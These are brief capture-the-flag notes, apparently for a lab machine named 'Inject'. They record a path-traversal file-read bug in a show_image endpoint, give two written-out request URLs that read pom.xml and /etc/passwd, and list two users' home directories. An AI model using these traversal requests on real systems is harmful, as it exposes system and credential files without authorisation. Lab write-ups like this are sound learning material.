# Inject

Check file upload, enumerate directories, dns etc

Apache Maven pom.xml LFI

`http://10.10.11.204:8080/show_image?img=../../../pom.xml`

Allows reading of /etc/passwd for users, can enumerate directories also

`http://10.10.11.204:8080/show_image?img=../../../../../../etc/passwd`

Phil's home dir:

```
.ansible
.bash_history
.bashrc
.cache
.gnupg
.local
.profile
shell9.sh
user.txt
```


Frank's home dir:

```
.ansible
.bash_history
.bashrc
.cache
.local
.m2
.profile
.viminfo
```